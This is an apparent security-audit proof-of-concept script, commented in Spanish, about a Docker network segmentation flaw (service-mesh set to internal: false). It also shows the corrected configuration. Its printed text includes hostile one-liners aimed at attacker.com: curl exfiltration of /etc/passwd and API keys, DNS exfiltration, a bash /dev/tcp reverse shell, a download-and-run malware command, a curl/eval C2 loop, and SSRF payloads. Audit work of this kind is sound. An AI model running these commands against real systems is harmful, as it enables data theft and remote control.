#!/usr/bin/env python3
"""
PoC #6: Network Segmentation Bypass
====================================
Vulnerabilidad: docker-compose.yml líneas 44-48
- service-mesh network tiene internal: false (debería ser true)
- Permite acceso externo a servicios que deberían ser internos

Impacto:
- Bypass de segmentación de red
- Acceso directo a microservicios internos
- Exposición de APIs no diseñadas para acceso público
- Facilita ataques laterales

CVSS: 7.5 (Alto)
CWE-923: Improper Restriction of Communication Channel to Intended Endpoints
"""

import requests
import subprocess
import sys


def analyze_network_config():
    """Analiza la configuración de red del docker-compose"""
    print("=" * 70)
    print("PoC #6: Network Segmentation Bypass")
    print("=" * 70)

    print("""
    [*] ANÁLISIS DE CONFIGURACIÓN DE RED

    docker-compose.yml define tres redes:

    1. public-net (sin configuración)
       -> Red para tráfico público
       -> CORRECTO: para reverse-proxy

    2. service-mesh:
       internal: false  <-- VULNERABILIDAD!
       -> Debería ser internal: true
       -> Permite acceso externo a servicios internos

    3. data-layer:
       internal: true
       -> CORRECTO: red interna para bases de datos
       -> Pero accesible desde service-mesh!

    [!] PROBLEMA:
        Los servicios en service-mesh pueden ser accedidos
        desde fuera del entorno Docker si los puertos están expuestos.
    """)


def demonstrate_network_attack():
    """Demuestra el ataque de bypass de red"""
    print("\n" + "-" * 70)
    print("DEMOSTRACIÓN DE BYPASS")
    print("-" * 70)

    print("""
    [*] ARQUITECTURA ACTUAL (VULNERABLE):

        Internet
            |
            v
        ┌─────────────────┐
        │  reverse-proxy  │  (public-net + service-mesh)
        │    Traefik      │
        └────────┬────────┘
                 │
        ┌────────┴────────┐ service-mesh (internal: FALSE!)
        │                 │
        v                 v
    ┌─────────┐     ┌──────────┐
    │ payment │     │ payment  │
    │  core   │     │  worker  │
    └────┬────┘     └──────────┘
         │
         v data-layer (internal: true)
    ┌─────────┐
    │users-db │
    │PostgreSQL│
    └─────────┘

    [!] PROBLEMA: service-mesh con internal:false permite:
        - Contenedores pueden resolver DNS externo
        - Tráfico puede salir a Internet
        - Potencial exfiltración de datos
        - Callbacks a servidores del atacante
    """)


def check_container_network_access():
    """Verifica acceso de red de contenedores"""
    print("\n" + "-" * 70)
    print("VERIFICACIÓN DE ACCESO DE RED")
    print("-" * 70)

    print("""
    [*] Comandos para verificar desde dentro de un contenedor:

    # Verificar si puede acceder a Internet
    $ docker exec payment-worker ping -c 1 8.8.8.8
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    64 bytes from 8.8.8.8: seq=0 ttl=117 time=10.5 ms
    [+] VULNERABLE: Contenedor puede acceder a Internet

    # Verificar resolución DNS externa
    $ docker exec payment-worker nslookup attacker.com
    Server:    127.0.0.11
    Address 1: 127.0.0.11
    Name:      attacker.com
    Address 1: 1.2.3.4
    [+] VULNERABLE: DNS externo funciona

    # Verificar acceso a otros contenedores
    $ docker exec payment-worker ping -c 1 payment-core
    PING payment-core (172.18.0.3): 56 data bytes
    64 bytes from 172.18.0.3: seq=0 ttl=64 time=0.1 ms
    [+] Comunicación interna funciona (esperado)
    """)


def demonstrate_exfiltration():
    """Demuestra técnicas de exfiltración"""
    print("\n" + "-" * 70)
    print("TÉCNICAS DE EXFILTRACIÓN DE DATOS")
    print("-" * 70)

    print("""
    [*] Con internal: false, un atacante con acceso al contenedor puede:

    1. EXFILTRACIÓN VIA HTTP
       $ curl -X POST https://attacker.com/exfil \\
         -d "data=$(cat /etc/passwd)"

    2. EXFILTRACIÓN VIA DNS
       $ data=$(cat /secrets/api_key | base64)
       $ nslookup $data.attacker.com

    3. REVERSE SHELL A INTERNET
       $ bash -i >& /dev/tcp/attacker.com/4444 0>&1

    4. DOWNLOAD DE HERRAMIENTAS
       $ curl -O https://attacker.com/malware.sh && chmod +x malware.sh && ./malware.sh

    5. C2 (COMMAND & CONTROL)
       $ while true; do
           cmd=$(curl -s https://attacker.com/cmd)
           eval $cmd | curl -X POST https://attacker.com/result -d @-
           sleep 60
         done

    [!] IMPACTO: Todos estos ataques serían bloqueados si internal: true
    """)


def demonstrate_ssrf_chain():
    """Demuestra la cadena de ataque con SSRF"""
    print("\n" + "-" * 70)
    print("CADENA: SSRF + NETWORK BYPASS")
    print("-" * 70)

    print("""
    [*] La vulnerabilidad SSRF en worker.py combinada con
        la red mal configurada permite:

    1. ATACANTE ENVÍA SSRF:
       POST /webhook
       {"url": "http://attacker.com/payload"}

    2. WORKER HACE CALLBACK:
       -> payment-worker conecta a attacker.com
       -> El atacante recibe confirmación de SSRF
       -> Puede enviar payloads maliciosos en respuesta

    3. SSRF INTERNO + EXFILTRACIÓN:
       # Primero, SSRF para leer datos internos
       POST /webhook
       {"url": "http://payment-core:5000/internal/secrets"}

       # Luego, SSRF para enviar datos al atacante
       POST /webhook
       {"url": "http://attacker.com/steal?data=SECRET_API_KEY"}

    [!] Si internal: true, el paso 2 y 3 serían bloqueados
        porque la red no permitiría conexiones externas.
    """)


def show_secure_configuration():
    """Muestra la configuración segura"""
    print("\n" + "-" * 70)
    print("CONFIGURACIÓN SEGURA RECOMENDADA")
    print("-" * 70)

    print("""
    [*] docker-compose.yml CORREGIDO:

    networks:
      public-net:
        # Red para servicios que necesitan acceso externo
        # Solo reverse-proxy debería estar aquí

      service-mesh:
        internal: true    # <-- CAMBIO CRÍTICO
        # Red interna para comunicación entre microservicios
        # Sin acceso a Internet

      data-layer:
        internal: true
        # Red aislada para bases de datos
        # Solo accesible desde service-mesh

    [*] BENEFICIOS:
        - Servicios internos no pueden iniciar conexiones externas
        - Bloquea exfiltración de datos
        - Bloquea reverse shells
        - Bloquea callbacks SSRF
        - Reduce superficie de ataque significativamente
    """)


def run_network_tests():
    """Ejecuta pruebas de red si Docker está disponible"""
    print("\n" + "-" * 70)
    print("PRUEBAS AUTOMATIZADAS")
    print("-" * 70)

    tests = [
        ("docker network ls", "Listar redes Docker"),
        ("docker network inspect app_2_service-mesh 2>/dev/null || echo 'Red no encontrada'", "Inspeccionar service-mesh"),
    ]

    for cmd, description in tests:
        print(f"\n[*] {description}")
        print(f"    $ {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.stdout:
                # Mostrar solo primeras líneas
                lines = result.stdout.strip().split('\n')[:10]
                for line in lines:
                    print(f"    {line}")
        except Exception as e:
            print(f"    Error: {e}")


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  NETWORK SEGMENTATION BYPASS - SOLO PARA PRUEBAS AUTORIZADAS  ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    analyze_network_config()
    demonstrate_network_attack()
    check_container_network_access()
    demonstrate_exfiltration()
    demonstrate_ssrf_chain()
    show_secure_configuration()
    run_network_tests()

    print("\n" + "=" * 70)
    print("RESUMEN DEL IMPACTO")
    print("=" * 70)
    print("""
    [!] VULNERABILIDAD: Red service-mesh sin aislamiento (internal: false)

    [!] IMPACTO:
        - Contenedores pueden conectar a Internet
        - Exfiltración de datos posible
        - Reverse shells funcionan
        - Callbacks SSRF exitosos
        - Download de malware posible
        - C2 (Command & Control) viable

    [!] COMBINACIÓN CON OTRAS VULNERABILIDADES:
        - SSRF + Network Bypass = Exfiltración completa
        - RCE + Network Bypass = Reverse shell a Internet
        - Container Escape + Network Bypass = Pivoting

    [!] REMEDIACIÓN:
        - Configurar internal: true en redes de microservicios
        - Usar network policies (si es Kubernetes)
        - Implementar egress filtering
        - Monitorear tráfico de red saliente
    """)
